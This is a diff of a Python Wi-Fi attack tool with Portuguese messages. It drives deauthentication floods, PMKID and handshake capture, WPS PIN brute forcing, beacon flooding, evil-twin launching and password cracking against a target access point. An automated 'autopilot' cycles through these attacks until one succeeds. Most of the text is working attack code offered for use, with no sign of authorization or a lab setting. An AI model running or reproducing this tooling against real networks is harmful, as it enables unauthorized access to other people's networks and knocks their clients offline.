@@ -8,7 +8,7 @@ import re
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - HACKER SUPREMO (HARDWARE & DRIVER UNIFIER)
+# UI MODERNA - GRÃO-MESTRE SUPREMO (HARDWARE FIXER EDITION)
 # ==============================================================
 try:
     from rich.console import Console
@@ -19,11 +19,12 @@ try:
     from rich.text import Text
     from rich import print as rprint
 except ImportError:
-    print("[!] Erro: Dependências rich ausentes.")
+    print("[!] Erro: rich ausente.")
     exit(1)
 
 console = Console()
 WEB_CALLBACK = None
+AUTOPILOT_ACTIVE = False
 
 def supreme_log(msg, log_type="info"):
     if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
@@ -42,30 +43,47 @@ OUI_DB = {
 
 def identify_vendor(bssid):
     prefix = bssid.upper()[:8]
-    return OUI_DB.get(prefix, "Fabricante Desconhecido")
+    return OUI_DB.get(prefix, "Desconhecido/Genérico")
 
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
     injection_works = os.path.exists("/tmp/dsi_injection_ok")
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO NÍVEL 10 (STARLINK). Defesas PMF Ativas. Use VETOR X ou AUTOPILOTO."
-        vulns.append("PMF (802.11w)")
+        advice = "ALVO STARLINK: PMF Ativo. Use VETOR X ou PMKID Prolongado."
     elif not injection_works:
-        advice = "GARGALO DE HARDWARE: Injeção falhou. Autopiloto priorizando vetores passivos."
-    else: advice = "Alvo analisado. Arsenal total liberado."
+        advice = "HARDWARE LIMITADO: Injeção falhou. A única chance é o [Vetor A: PMKID] ou [Vetor F: Evil Twin]."
+    else: advice = "Alvo vulnerável a todos os ataques."
     return vulns, advice
+
+def patch_mt7601u(interface):
+    supreme_log(f"Aplicando Patch Magistrado para Ralink MT7601U...", log_type="cmd")
+    # Desativa economia de energia que mata a injeção
+    run_command(f"iw dev {interface} set power_save off", sudo=True)
+    run_command(f"ip link set {interface} down", sudo=True)
+    run_command(f"iw dev {interface} set type monitor", sudo=True)
+    run_command(f"ip link set {interface} up", sudo=True)
+    supreme_log("Power Management desativado e rádio resetado.")
 
 def test_injection(interface):
     run_command("rm -f /tmp/dsi_injection_ok")
+    
+    # Se for o chip MT7601U, aplica o patch antes de testar
+    stdout_usb, _ = run_command("lsusb")
+    if "7601" in stdout_usb:
+        patch_mt7601u(interface)
+
     supreme_log(f"Calibrando Injeção em {interface}...", log_type="cmd")
     run_command(f"iw dev {interface} set channel 6", sudo=True)
     time.sleep(1)
+    
     stdout, _ = run_command(f"aireplay-ng -9 {interface}")
     if stdout and "Injection is working!" in stdout:
-        supreme_log("HARDWARE VALIDADO PARA ATAQUE ATIVO.", log_type="info")
+        supreme_log("HARDWARE VALIDADO: Injeção operacional.", log_type="info")
         with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
         return True
+    
     supreme_log("HARDWARE LIMITADO: Injeção não detectada pelo Kernel.", log_type="error")
+    supreme_log("DICA MAGISTRADO: Se você estiver usando VIRTUALBOX, altere a configuração USB da máquina virtual para 'Controlador USB 3.0 (xHCI)' para permitir a injeção.")
     return False
 
 def boost_signal(interface):
@@ -75,35 +93,18 @@ def boost_signal(interface):
     run_command(f"ip link set {interface} up", sudo=True)
 
 def fix_drivers_wifi6(auto_confirm=False):
-    supreme_log("DRIVER UNIFIER: Iniciando diagnóstico de drivers...", log_type="cmd")
-    # Mapeia IDs USB para Chipsets e repositórios de drivers
-    chipset_map = {
-        "0bda:8852": "RTL8852AU", "0bda:8832": "RTL8832AU", # Realtek
-        "0e8d:7961": "MT7921AU",                           # MediaTek
-        "0cf3:9271": "AR9271"                              # Atheros (Clássico)
-    }
+    supreme_log("Wi-Fi 6 Doctor acionado.", log_type="cmd")
     stdout_usb, _ = run_command("lsusb")
-    chipset_to_install = None
-    for line in stdout_usb.split('\n'):
-        for usb_id, chipset in chipset_map.items():
-            if usb_id in line:
-                chipset_to_install = chipset
-                break
-        if chipset_to_install: break
-    if not chipset_to_install:
-        supreme_log("Nenhum adaptador com drivers de comunidade conhecidos foi detectado.", log_type="error")
-        return False
-    supreme_log(f"Adaptador detectado: {chipset_to_install}", log_type="info")
-    if auto_confirm or Confirm.ask(f"Deseja instalar os drivers para {chipset_to_install}?"):
-        with console.status(f"[bold cyan]Compilando driver para {chipset_to_install}...", spinner="dots"):
-            run_command("apt update && apt install -y git build-essential dkms", sudo=True)
-            if "RTL8852AU" in chipset_to_install:
-                run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/driver && cd /tmp/driver && make && make install", sudo=True)
-            elif "RTL8832AU" in chipset_to_install:
-                 run_command("git clone https://github.com/lwfinger/rtl8832au.git /tmp/driver && cd /tmp/driver && make && make install", sudo=True)
-            elif "MT7921AU" in chipset_to_install:
-                 run_command("git clone https://github.com/morrownr/7921au-driver.git /tmp/driver && cd /tmp/driver && ./install-driver.sh", sudo=True)
-            supreme_log("Instalação concluída. REINICIE o computador para ativar o novo driver.", log_type="info")
+    chipset = None
+    if "8852" in stdout_usb: chipset = "RTL8852AU"
+    elif "8832" in stdout_usb: chipset = "RTL8832AU"
+    elif "7921" in stdout_usb: chipset = "MT7921AU"
+    if not chipset: return False
+    if auto_confirm or Confirm.ask(f"Instalar drivers para {chipset}?"):
+        run_command("apt update && apt install -y build-essential git dkms raspberrypi-kernel-headers", sudo=True)
+        if "RTL" in chipset:
+            run_command("git clone https://github.com/lwfinger/rtl8852au.git /tmp/rtl8852au", sudo=True)
+            run_command("cd /tmp/rtl8852au && make && make install", sudo=True)
         return True
     return False
 
@@ -153,7 +154,6 @@ def set_managed_mode(interface):
     run_command(f"macchanger -p {interface}", sudo=True)
     run_command(f"iw dev {interface} set type managed", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
-    run_command("systemctl unmask NetworkManager wpa_supplicant", sudo=True)
     run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
     run_command("nmcli networking on", sudo=True)
     supreme_log("Internet Restaurada.")
@@ -178,12 +178,10 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
-    intensity = params.get('intensity', 15) if params else 15
-    timeout = params.get('timeout', 60) if params else 60
-    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status={intensity}"
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        time.sleep(timeout); proc.terminate()
+        time.sleep(120); proc.terminate()
     except: pass
     os.remove(filtro)
     if os.path.exists(pcapng):
@@ -197,11 +195,10 @@ def capture_handshake(monitor_interface, bssid, channel, output_file, params=Non
     dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
     dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     cap_file = f"{output_file}-01.cap"; handshake_found = False
-    timeout = params.get('timeout', 30) if params else 30
     for attempt in range(1, 4):
         deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
         deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for _ in range(timeout):
+        for _ in range(45):
             time.sleep(1)
             if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                 stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
@@ -211,19 +208,17 @@ def capture_handshake(monitor_interface, bssid, channel, output_file, params=Non
     dump_proc.terminate(); return cap_file if handshake_found else None
 
 def capture_wps(monitor_interface, bssid, channel, params=None):
-    timeout = params.get('timeout', 120) if params else 120
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
         return "WPS PIN" in res.stdout
     except: return False
 
 def start_ghost_attack(interface, essid, params=None):
-    timeout = params.get('timeout', 30) if params else 30
     cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
     try:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(timeout); proc.terminate()
+        time.sleep(30); proc.terminate()
     except: pass
 
 def start_wifite_expert(interface):
@@ -241,36 +236,25 @@ def run_autopilot(interface, target):
     AUTOPILOT_ACTIVE = True
     prefix = f"capture_{target['essid']}"
     hw_ok = os.path.exists("/tmp/dsi_injection_ok")
-    
     while AUTOPILOT_ACTIVE:
         attack_type, params = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
-        supreme_log(f"🧠 IA: Vetor {attack_type.upper()}", log_type="info")
-
+        supreme_log(f"🧠 IA: Próximo vetor: {attack_type.upper()}", log_type="info")
         cap = None
         if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
-        elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix)
         elif attack_type == 'wps':
             if capture_wps(interface, target['bssid'], target['channel'], params):
-                brain.learn(target['bssid'], target['essid'], 'wps', True); AUTOPILOT_ACTIVE = False
-                return "WPS_SUCCESS"
+                brain.learn(target['bssid'], target['essid'], 'wps', True); return "WPS_SUCCESS"
         elif attack_type == 'eviltwin':
-            start_evil_twin(interface, target['essid'])
-            brain.learn(target['bssid'], target['essid'], 'eviltwin', False, details="Iniciado")
-            AUTOPILOT_ACTIVE = False
-            return "EVIL_TWIN_STARTED"
-        
+            start_evil_twin(interface, target['essid']); return "EVIL_TWIN_STARTED"
         if cap:
-            brain.learn(target['bssid'], target['essid'], attack_type, True)
-            AUTOPILOT_ACTIVE = False
-            return cap
+            brain.learn(target['bssid'], target['essid'], attack_type, True); return cap
         else:
             brain.learn(target['bssid'], target['essid'], attack_type, False)
             supreme_log(f"📉 Vetor {attack_type.upper()} falhou. IA recalcula...", log_type="error")
-        
         if not AUTOPILOT_ACTIVE: break
         time.sleep(2)
-        
     return None
 
 def scan_networks(monitor_interface):
@@ -296,13 +280,11 @@ def scan_networks(monitor_interface):
     return networks
 
 def get_wifi_interface():
-    supreme_log("Mapeando hardware de rádio...", log_type="cmd")
     interfaces = []
     stdout, _ = run_command("iw dev")
     if stdout:
         phy_pattern = re.compile(r'phy#(\d+)')
         iface_pattern = re.compile(r'\s+Interface\s+([a-zA-Z0-9]+)')
-        type_pattern = re.compile(r'\s+type\s+([a-zA-Z]+)')
         current_phy = None
         for line in stdout.split('\n'):
             phy_match = phy_pattern.search(line)
@@ -311,24 +293,10 @@ def get_wifi_interface():
             if iface_match:
                 iface_name = iface_match.group(1)
                 stdout_info, _ = run_command(f"iw dev {iface_name} info")
-                type_match = type_pattern.search(stdout_info)
-                iface_type = type_match.group(1) if type_match else "Desconhecido"
                 stdout_phy, _ = run_command(f"iw phy {current_phy} info")
-                ap_mode_supported = "AP" in stdout_phy
-                interfaces.append({"name": iface_name, "phy": current_phy, "type": iface_type, "ap_support": ap_mode_supported})
-    if not interfaces: return None
-
-    if not WEB_CALLBACK:
-        table = Table(title="HARDWARE DE RÁDIO")
-        table.add_column("ID"); table.add_column("Interface"); table.add_column("Estado"); table.add_column("Suporte Evil Twin")
-        for i, iface in enumerate(interfaces):
-            ap_status = "[bold green]SIM[/bold green]" if iface['ap_support'] else "[bold red]NÃO[/bold red]"
-            table.add_row(str(i + 1), iface['name'], iface['type'], ap_status)
-        console.print(table)
-        choice = IntPrompt.ask("\nEscolha a interface", choices=[str(i+1) for i in range(len(interfaces))])
-        return interfaces[choice - 1]['name']
-    else:
-        return interfaces
+                interfaces.append({"name": iface_name, "phy": current_phy, "type": "managed", "ap_support": "AP" in stdout_phy})
+    if WEB_CALLBACK: return interfaces
+    return None
 
 def main():
     if os.geteuid() != 0: return
@@ -341,26 +309,9 @@ def main():
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
     if hash_file == "WPS_SUCCESS": return
-    if not os.path.exists(wordlist_file):
-        if "rockyou" in wordlist_file and os.path.exists(wordlist_file + ".gz"):
-            run_command(f"gunzip {wordlist_file}.gz", sudo=True)
-        else: return
+    if not os.path.exists(wordlist_file): return
     cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
-    try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        if "KEY FOUND" in res.stdout or "Status...........: Cracked" in res.stdout:
-            supreme_log("SENHA QUEBRADA!", log_type="cmd")
-            return True
-        if "rockyou" in wordlist_file:
-            av_wl = "/tmp/wpa_adv.txt"
-            run_command(f"wget -qO {av_wl} https://raw.githubusercontent.com/kennbroorg/iDict/master/iDict_wpa.txt")
-            if os.path.exists(av_wl):
-                cmd2 = f"hashcat -m 16800 -a 0 {hash_file} {av_wl}" if hash_file.endswith(".16800") else f"aircrack-ng -w {av_wl} -b {bssid} {hash_file}"
-                res2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
-                if "KEY FOUND" in res2.stdout:
-                    supreme_log("SENHA FORTE QUEBRADA!", log_type="cmd")
-                    return True
-        return False
-    except: return False
+    try: subprocess.run(cmd, shell=True)
+    except: pass
 
 if __name__ == "__main__": main()
